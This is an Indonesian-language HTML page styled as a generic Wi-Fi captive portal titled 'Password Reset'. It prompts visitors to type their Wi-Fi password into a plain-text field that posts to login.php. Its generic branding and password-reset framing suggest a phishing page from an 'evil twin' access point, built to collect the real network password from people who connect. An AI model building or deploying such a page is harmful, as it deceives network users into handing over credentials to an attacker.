
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#07111f">
    <title>Wi-Fi | Password Reset</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="portal">
        <div class="logo-container">
            <img
                src="assets/wifi-logo.svg"
                alt="Logo Wi-Fi"
                class="wifi-logo"
            >
        </div>

        <p class="eyebrow">WIFI</p>
        <h1>Terhubung ke Internet</h1>
        <p class="description">
            Selamat datang! Masukkan Password.
        </p>

        <form action="login.php" method="POST">
            <label for="nama">Password</label>
            <input
                type="text"
                id="nama"
                name="nama"
                placeholder="Masukkan Password"
                maxlength="100"
                autocomplete="name"
                required
            >

            <button type="submit">
                Sambungkan
                <span aria-hidden="true">→</span>
            </button>
        </form>

        <div class="connection-status">
            <span class="status-dot"></span>
            Portal masuk Wi-Fi
        </div>

        <p class="notice">
            Dengan melanjutkan, Anda menyetujui ketentuan penggunaan
            jaringan Wi-Fi ini.
        </p>
        <footer>
            <span>POWERED BY</span>
            <strong>WIFI-HOME</strong>
        </footer>
    </main>
</body>
</html>